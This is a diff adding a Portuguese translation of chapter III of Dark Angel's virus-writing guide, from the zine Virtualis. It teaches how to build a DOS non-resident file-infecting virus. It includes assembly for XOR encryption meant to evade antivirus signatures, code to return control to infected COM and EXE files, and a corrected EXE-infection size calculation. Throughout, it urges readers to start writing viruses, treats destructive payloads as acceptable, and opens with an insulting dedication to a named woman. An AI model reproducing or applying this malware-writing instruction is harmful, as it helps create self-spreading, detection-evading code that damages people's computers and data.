@@ -1,0 +1,497 @@
+   ___________________________________________________________________
+  |                                                                   |
+  |  Curso de vírus - parte 3                                         |
+  |     Dark Angel's Phunky Virus Writing Guide                       |
+  |                                                                   |
+  |                                           traduzido por Dr Herman | 
+  |___________________________________________________________________|
+
+
+      //==//  //  //  /||      //      //====  //==//  //|   //
+     //  //  //  //  //||     //      //      //  //  //||  //
+    //==//  //==//  //=||    //      //      //  //  // || //
+   //      //  //  //  ||   //      //      //  //  //  ||//
+  //      //  //  //   ||  //====  //====  //==//  //   ||/
+  
+     /====   // //     //  /====   /|   /|
+    //      // //     //  //      //|  //|
+    ===\   // //     //   ===\   //|| //||
+      //  //  \\    //      //  // ||// ||
+  ====/  //    \\  //   ====/  //  ||/  ||
+  
+  -----------------------------------------------
+  DISCLAIMER: Por  meio  deste,  eu  declaro  ter 
+    escrito este arquivo
+  -----------------------------------------------
+  DEDICATÓRIA: Este é  dedicado  a Patty Hoffman,
+    aquela vaca gorda que  nem sabe  seu  próprio
+    nome, e  para  os  milhares  de  idiotas  que 
+    entraram em  pânico com o  Michelangelo e não
+    tocaram em seus computadores por todo um dia.
+  -----------------------------------------------
+  SAUDAÇÕES:    para   todos   os    membros   da 
+    PHALCON/SKISM    especialmente   Garbageheap, 
+    Hellraiser e Demogorgon.
+  -----------------------------------------------
+  
+  Dark Angel's Crunchy Virus Writing Guide
+  ---- ------- ------- ----- ------- -----
+       "It's the right thing to do"
+  
+  --------------------------------------------
+  CÁPITULO III: VÍRUS NÃO-RESIDENTES, PARTE II
+  --------------------------------------------
+
+  Bem-vindo ao terceiro capítulo do meu Guia. No capítulo anterior,
+  cobri a primeira parte de um vírus -- o replicador. Como prometido, 
+  devo cobrir agora o restante do vírus não-residente e apresentar 
+  código que, quando combinado com o código do capítulo anterior, será
+  suficiente para permitir que qualquer um escreva um vírus simples.
+  Adicionalmente, mostrarei algumas dicas que podem ajudar você a 
+  otimizar seu código.
+  
+  -----------
+  O OCULTADOR
+  -----------
+
+  O ocultador é a defesa mais comum usada por programadores de vírus
+  para evitar detecção. A rotina de encriptação/decriptação mais comum
+  é XOR, já que pode usada tanto para encriptação como decriptação.
+  
+  valor_encriptar   dw   ?   ; deve estar em algum lugar na área decriptada
+  
+  decripta:
+  encripta:
+       mov dx, word ptr [bp+valor_encriptar]
+       mov cx, (fim_parte_encriptar - inicio_parte_encriptar + 1) / 2
+       lea si, [bp+inicio_parte_encriptar]
+       mov di, si
+  
+  loop_xor:
+       lodsw
+       xor ax, dx
+       stosw
+       loop loop_xor
+  
+  A rotina anterior usa um simples XOR para encriptar ou decriptar
+  código em memória. É essencialmente a mesma rotina da primeira lição,
+  exceto por decriptar palavras (words) ao invés de bytes. Ela tem
+  então 65.535 mutações ao contrário das 255 e também é duas vezes mais
+  rápida. Mesmo sendo simples de ser entendida, ela deixa muito a
+  desejar já que é grande e está quase implorando para ser uma string 
+  de rastreamento. Um método melhor segue:
+  
+  valor_encriptar   dw    ?
+  
+  decripta:
+  encripta:
+       mov dx, word ptr [bp+valor_encriptar]
+       lea bx, [bp+inicio_parte_encriptar]
+       mov cx, (fim_parte_encriptar - inicio_parte_encriptar + 1) / 2
+  
+  loop_xor:
+       xor word ptr [bx], dx
+       add bx, 2
+       loop loop_xor
+
+  
+  Embora este código seja muito menor, ainda é possível reduzir seu
+  tamanho. O melhor método é inserir os valores para encriptação, BX
+  e CX, em tempo de infecção.
+
+  
+  decripta:
+  encripta:
+       mov bx, 0FFFFh
+       mov cx, 0FFFFh
+  
+  loop_xor:
+       xor word ptr [bx], 0FFFFh
+       add bx, 2
+       loop loop_xor
+
+
+  Todos os valores 0FFFFh devem ser alterados durante a infecção por
+  valores apropriados para o arquivo infectado. Por exemplo, BX deveria
+  ser carregado com o deslocamento de "inicio_parte_encriptar" relativo
+  ao início do arquivo infectado quando a rotina de encriptação for
+  gravada no arquivo infectado.
+
+  A principal vantagem do código usado acima é a minimização do tamanho
+  do código de rastreamento. O código de rastreamento consiste apenas
+  das porções do código que permanecem constantes. Neste caso, existem
+  apenas 3 ou 4 bytes consecutivos que permanecem constantes. Já que a
+  encripção consite de apenas alguns bytes, o tamanho do código de
+  rastreamento é extremamente pequeno.
+  
+  Embora a função de encriptação seja clara, talvez o valor inicial de
+  encriptação e o cálculo dos valores subseqüentes não sejam tão
+  claros. O valor inicial para a maioria da encriptações XOR deve ser
+  0. Você pode mudar o valor de encriptação durante o processo de
+  infecção. Um valor de encriptação aleatório é desejável. O método 
+  mais simples de se obter um valor aleatório é consultar o relógio
+  (clock) interno. Um número aleatório pode ser facilmente obtido
+  assim:
+
+  
+      mov   ah, 2Ch           ; me dê um número aleatório
+      int   21h
+      mov   word ptr [bp+valor_encriptar], dx ; CX tbém pode ser usado
+
+
+  Algumas rotinas de encriptação não utilizam um valor inicial 0. Por
+  exemplo, dê uma olhada no "Whale". Ele usa o valor da palavra
+  anterior como valor de encriptação. Nestes casos, simplesmente use
+  um JMP para pular a rotina de decriptação quando codificar o vírus.
+  Entretanto, certifique-se que as infecções saltem (JMP) para o local
+  certo! Por exemplo, é assim que você deve codificar tal vírus:
+  
+             org     100h
+    início:  jmp     depois_da_encriptação
+   
+    ; coloque sua rotina de encriptação aqui
+  
+    depois_da_encriptação:
+
+
+  A rotina de encriptação é a única parte do vírus que precisa ser
+  decriptada. Através de técnicas de movimento de código (code-moving),
+  é possível copiar o mecanismo de infecção para o heap (local de
+  memória depois do final do arquivo e antes da pilha). Tudo que é 
+  preciso são algumas instruções MOVSW e um JMP. Primeiro, a rotina de
+  encriptação deve ser copiada, depois a gravação, depois a 
+  decriptação, e depois o RETorno para o programa. Por exemplo:
+
+  
+       lea si, [bp+rotina_encriptação]
+       lea di, [bp+heap]
+       mov cx, tamanho_rotina_encriptação
+       push si
+       push cx
+       rep movsb
+  
+       lea si, [bp+rotina_escrita]
+       mov cx, tamanho_rotina_encriptação
+       rep movsb
+  
+       pop cx
+       pop si
+       rep movsb
+  
+       mov al, 0C3h                ; fixa um novo retorno
+       stosb
+  
+       call [bp+heap]
+  
+  
+  Ainda que a maioria dos vírus, para simplicidade, usem a mesma rotina
+  tanto para encriptar como para decriptar, o código acima mostra que
+  isso é completamente desnecessário. A única modificação do código
+  acima para a inclusão de uma rotina de decriptação separada é
+  retirar os PUSHs e trocá-los por POPs com o apropriado LEA SI e 
+  MOV CX.
+
+  Rotinas originais de encriptação, mesmo interessantes, não são as
+  melhores. "Chupar" rotinas de encriptação é o melhor, especialmente
+  aquelas de programas shareware! Sydex é famosa por usar encriptação
+  em seus programas shareware. Dê uma olhada em rotinas de encriptação
+  destes programas e sinta-se a vontade para copiá-las. Com sorte,
+  os desenvolvedores de pacotes anti-vírus criarão uma string de
+  rastreamento que irá detectar a infecção do seu vírus em produtos
+  shareware simplesmente porque a encriptação é a mesma.
+
+  Observe que isto não é um tratamento completo de rotinas de 
+  ocultação. Um artigo completo deve ser escritos apenas com técnicas
+  de encriptação e decriptação. Esta é apenas a mais simples da
+  técnicas de encriptação e existem técnicas muito melhores
+  disponíveis. Entretanto, para o iniciante, isso é o suficiente.
+  
+
+  -------------
+  O DESPACHANTE
+  -------------
+
+  O despachante é a parte do vírus que retorna o controle ao programa 
+  infectado. Os despachantes para arquivos EXE e COM são naturalmente 
+  diferentes.
+  
+  Em arquivos COM, você deve restaurar alguns bytes que foram
+  sobrescritos por seu vírus e então transferir o controle de volta
+  para CS:100h, que é onde todos os arquivos COM são inicialmente
+  carregados.
+  
+  RestauraCOM:
+       mov di, 100h                ; estamos copiando para o início
+       lea si, [bp+bufferGravação] ; estamos compiando a partir do nosso buffer
+       push di                     ; guardamos o deslocamento para o retorno (100h)
+       movsw                       ; mais eficiente que mov cx, 3, movsb
+       movsb                       ; altere de acordo com sua necessidade 
+       retn                        ; um JMP também funciona
+
+  Arquivos EXE precisam apenas da restauração do segmento de
+  pilha/ponteiro e o segmento de código/ponteiro de instrução.  
+  
+  RetornoEXE:
+       mov     ax, es                            ; inicia no segmento PSP
+       add     ax, 10h                           ; pula o PSP
+       add     word ptr cs:[bp+OndeSaltarEXE+2], ax
+       cli
+       add     ax, word ptr cs:[bp+SalvaPilha+2] ; restaura a pilha
+       mov     ss, ax
+       mov     sp, word ptr cs:[bp+SalvaPilha]
+       sti
+       db      0eah                              ; JMP FAR PTR SEG:OFF
+  OndeSaltarEXE:
+       dd      0
+  SalvaPilha:
+       dd      0
+  
+  OndeSaltarEXE2   dd 0
+  SalvaPilha2      dd 0
+
+  
+  Durante a infecção, CS:IP e SS:SP devem ser armazenados em
+  OndeSaltarEXE2 e SalvaPilha2, respectivamente. Eles devem ser movidos
+  para OndeSaltarEXE e SalvaPilha antes de restaurarmos o programa.
+  Esta restauração deve ser facilmente acompanhada com uma série de
+  instruções MOVSW.
+
+  Tem gente que gosta de limpar todos os registro antes de JMP/RET, 
+  i.e., eles usam várias instruções XOR para isso. Se você se sente 
+  bem e gosta de desperdiçar código, tudo bem, mas isso é totalmente
+  desnecessário na maioria dos casos.
+  
+
+  -------
+  A BOMBA
+  -------
+  
+    "O horror! O horror!"
+       - Joseph Conrad, The Heart of Darkness (O Coração das Trevas)
+  
+  O que passa pela mente de um usuário medíocre quando um vírus é
+  ativado? Que tipo de terror a vítima sente quando seu computador
+  toca uma música nazista? Quão horrível deve ser perder horas de
+  trabalho num único instante!
+
+  Realmente, eu não apoio a destruição de dados e discos por vírus.
+  Isso não tem propósito e geralmente mostra pouca imaginação. Por
+  exemplo, o mundialmente famoso vírus Michelangelo não fazia nada 
+  mais do que sobrescrever alguns setores do disco com dados pegos
+  aleatoriamente na memória. Muito original. É claro, se você é chegado
+  em destruição, vá em frente e destrua tudo que quiser, mas lembre-se
+  que esta parte do vírus geralmente é a única exergada pelos usuários
+  e distingue-o dos outros vírus. Os melhores exemplos que posso citar
+  são: Ambulance Car, Cascade, Ping Pong, e Zero Hunt. Não se esqueça
+  os da série PHALCON/SKISM, especialmente os meus (eu tinha que fazer
+  um comercial do grupo...)
+  
+  Como pode ver, não há código para comentar nesta seção. Já que todas
+  as "bombas" devem ser originais, não faz muito sentido colocar código
+  para uma aqui! É claro, alguns vírus não contêm nenhuma bomba.
+  Geralmente, apenas aqueles com menos de 500 bytes não possuem bombas.
+  Não há vantagem em não ter um bomba, a não ser pelo tamanho.
+
+  
+  ---------
+  MEA CULPA
+  ---------
+
+  Lamento informar que o infectador EXE apresentado na última lição não
+  estava totalmente perfeito. Eu admito isso. Cometi um erro de
+  proporções colossais. O cálculo do tamanho do arquivo e do tamanho do
+  arquivo MOD 512 estava ferrado. Eis a versão corrigida:
+  
+  ; na entrada, DX:AX armazenam o NOVO tamanho do arquivo 
+
+  
+          push    ax           ; guarda a palavra (word) baixa 
+                               ; do tamanho do arquivo
+          mov     cl, 9        ; 2^9 = 512
+          shr     ax, cl       ; / 512
+          ror     dx, cl       ; / 512 (sort of)
+          stc                  ; verifica a descrição do cabeçalho EXE
+                               ; para explicar a adição 
+          adc     dx, ax       ; de 1 a parte DIV 512
+          pop     ax           ; restaura a palavra baixa do 
+                               ; tamanho do arquivo
+          and     ah, 1        ; MOD 512
+
+
+  Isto resulta no tamanho do arquivo / 512 + 1 em DX e o tamanho do
+  arquivo MOD 512 em AX. O resto permanece igual. Teste sua rotina de
+  infecção EXE com o LINK.EXE da Microsoft, uma vez que ele não irá
+  rodar a menos que a infecção EXE esteja perfeita.
+  
+  Eu poupei você da encrenca e me humilhei por este erro idiota.
+
+  
+  ---------------
+  DICAS E TRUQUES
+  ---------------
+
+  Bom, agora já vimos todas as partes de um vírus não-residente. Agora,
+  apresentarei algumas técnicas simples que todos podem incorporar em
+  seus vírus para aumentar a eficiência.
+
+  1. Use o heap
+     
+     O heap é a área de memória entre o fim do código e o topo da
+     pilha. Ele pode ser convenientemente tratado como uma área de
+     dados por um vírus. Ao mover variáveis para o heap, o vírus não
+     precisa mais manter variáveis em seu código, diminuindo assim seu
+     tamanho. Observe que o conteúdo do heap não faz parte do vírus,
+     ele apenas armazena variáveis temporárias lá, i.e., a rotina de
+     infecção não deve tomar o heap como parte do vírus já que isso
+     iria destruir seu objetivo. Existem dois modos de usar o heap:
+         
+       ; Primeiro vírus
+       
+       Fim_do_virus:
+       Var1 equ $
+       Var2 equ Var1 + TamanhoVar1
+       Var3 equ Var2 + TamanhoVar2
+       Var4 equ Var3 + TamanhoVar3
+       
+       ; Exemplo do primeiro método
+       
+       Fim_do_virus:
+       DiretorioInicial = $
+       DTA_Temp    = DiretorioInicial + 64
+       Tamanho_Arq = DTA_Temp + 42
+       Flag        = Tamanho_Arq + 4
+       
+       ; Segundo método
+       
+       Fim_do_virus:
+       Var1 db TamanhoVar1 dup (?)
+       Var2 db TamanhoVar2 dup (?)
+       Var3 db TamanhoVar3 dup (?)
+       Var4 db TamanhoVar4 dup (?)
+       
+       ; Exemplo do segundo método
+
+       Fim_do_virus:
+       DiretorioInicial db 64 dup (?)
+       DTA_Temp         db 42 dup (?)
+       Tamanho_Arq      dd ?
+       Flag             db ?
+
+       
+     Os dois métodos diferem um pouco. Usando o primeiro método, você
+     cria um arquivo que terá o tamanho exato do vírus (mais o código
+     inicial). Entretanto, quando for referenciar as variáveis,
+     especificações de tamanho como BYTE PTR, WORD PTR, DWORD PTR, etc,
+     devem sempre ser usadas ou o assembler se atrapalhará. Vírus
+     codificados com o segundo método não precisam de especificações de
+     tamanho, mas o arquivo resultante será maior que o tamanho real do
+     vírus. Ainda que isso não seja um problema, dependendo da checagem
+     de reinfecção, o vírus pode infectar o arquivo original quando
+     rodar. Isso não é uma deficiência, especialmente considerando as
+     vantagens deste método.
+  
+     Em qualquer caso, o uso do heap pode diminuir bastante o tamanho
+     do vírus e torná-lo muito mais eficiente. A única coisa a ser
+     observada na infecção de arquivos COM grandes onde o heap pode
+     estourar o segmento 0, corrompendo o PSP. Entretanto, este
+     problema é facilmente evitado. Para verificar se um arquivo COM é
+     muito grande para ser infectado desta maneira, simplesmente
+     adicione o tamanho da área de variáveis temporárias ao tamanho do
+     vírus.
+     
+  
+  2. Utilizar procedures
+ 
+     Procedures são úteis para reduzir o tamanho do vírus, o que é 
+     sempre algo desejável. Apenas use procedure se vai lhe poupar
+     espaço. Para determinar a quantidade de bytes poupados pelo uso
+     da procedure, use a seguinte fórmula:
+     
+       PS = tamanho da procedure, em bytes.       
+       Bytes poupados = (PS - 4) * número de chamdas - PS
+
+     Por exemplo, a procedure de fechamento de arquivo
+
+       fecha_arq:
+         mov ah, 3eh  ; 2 bytes
+         int 21h      ; 2 bytes
+         ret          ; 1 byte
+                      ; PS = 2+2+1 = 5
+      
+     Ela apenas é viável se for chamada 6 vezes ou mais, já que 
+     (5-4)*6-5=1. Uma grande economia de 1 byte! Já que nenhum vírus
+     fecha um arquivo em 6 lugares diferentes, esta procedure é
+     certamente inútil e deve ser evitada.
+
+     Sempre que possível, desenhe procedures que sejem tão flexíveis
+     quanto possível. Este é o principal motivo pelo qual o código
+     búlgaro é tão pequeno. Dê uma olhada no código fonte do vírus
+     "Creeping Death". Por exemplo, a procedure "mover ponteiro de
+     arquivo":
+
+       va_eof:
+         mov al, 2
+       mova_ponteiro:
+         xor dx, dx
+       va_algum_lugar:
+         xor cx, cx
+         mov ah, 42h
+         int 21h
+         ret      
+       
+     A função deve ser criada com flexibilidade em mente. Com uma
+     chamada a 'va_eof', a procedure moverá o ponteiro de arquivo para
+     o final do mesmo. Uma chamada para 'mova_ponteiro' com AL em 0, o
+     ponteiro de arquivo será zerado (reset). Uma chamada para
+     'va_algum_lugar' com DX e AL setados, o ponteiro de arquivo pode
+     ser movido para qualquer ponto do arquivo. Se a função é muito
+     utilizada, a economia é enorme.
+       
+
+  3. Use um bons assemblers e debuggers
+
+     O melhor assembler que encontrei até hoje é o Turbo Assembler. Ele
+     gera código compacto num instante. Use a opção /m2 para eliminar
+     todos os NOPs do código. As vantagens são óbvias - desenvolvimento
+     mais rápido e código menor. 
+
+     O melhor debugger também é da Borland, a rainha da ferramentas de 
+     desenvolvimento. O Turbo Debugger tem tantos recursos que você
+     pode querer comprá-lo apenas para poder ler seu manual! Ele evita
+     várias armadilhas de depuração e é ideal para testes. 
+     Adicionalmente, este debugger possui modos protegidos específicos
+     para 286 e 386, cada qual sendo mais poderoso que seus respectivos
+     modos reais.
+
+
+  4. Não usar MOV no lugar de LEA
+     
+     Ao escrever seu primeiro vírus, você pode se esquecer de usar LEA
+     no lugar de MOV ao carregar deslocamentos (offsets). É um grande
+     erro freqüentemente cometido por iniciantes. O efeito de tal erro
+     é imediatamente percebido. Se o vírus não está funcionando, 
+     procure por este erro. É quase tão difícil de encontrar como o 
+     erro de ponteiro NULL em C.
+
+  
+  5. Leia os últimos números de 40Hex
+
+     40Hex, o jornal oficial de técnicas e notícias sobre vírus da 
+     PHALCON/SKISM, é uma publicação indispensável para qualquer
+     escritor de vírus sério. Cada edição contém técnicas e código
+     fonte, projetadas para auxiliar todos os escritores de vírus,
+     sejam iniciantes ou experts. Notícias relacionadas a vírus também
+     são publicadas. Pegue, leia, ame e devore!
+  
+  ----------
+  E AGORA...
+  ----------
+
+  ... Você tem todo o código e informação suficientes para escrever um
+  vírus razoável. Pare de ler e começe a codificar! O único jeito de
+  ficar bom é através da prática. Após duas ou três tentativas, você
+  deve estar pronto para escrever bons vírus.
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+  --------------------------------------------------------------------
+  Virtualis nº9 -- Curso de vírus - parte 3
